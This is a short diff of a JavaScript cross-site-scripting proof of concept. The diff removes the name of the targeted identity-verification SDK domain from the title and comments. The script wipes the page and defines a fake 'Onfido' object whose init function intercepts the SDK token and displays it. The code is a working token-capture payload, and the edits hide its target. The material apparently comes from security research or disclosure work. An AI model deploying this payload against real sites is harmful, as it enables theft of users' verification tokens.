@@ -1,6 +1,6 @@
 (function() {
   var d = document;
-  d.title = "XSS PoC - sdk.onfido.com";
+  d.title = "XSS PoC";
   d.body.innerHTML = "";
 
   var box = d.createElement("div");
@@ -23,14 +23,14 @@
   });
   html += "</table>";
 
-  // Intercept Onfido.init to capture the SDK token
+  // Intercept init to capture the SDK token
   html += "<h3 style='margin:20px 0 10px'>SDK Token Interception</h3>";
   html += "<div id='token-output' style='padding:10px;background:#f5f5f5;border:1px solid #ddd;word-break:break-all'>Waiting for SDK init...</div>";
 
   box.innerHTML = html;
   d.body.appendChild(box);
 
-  // Define fake Onfido object to intercept the token
+  // Define fake object to intercept the token
   window.Onfido = {
     init: function(opts) {
       var out = d.getElementById("token-output");
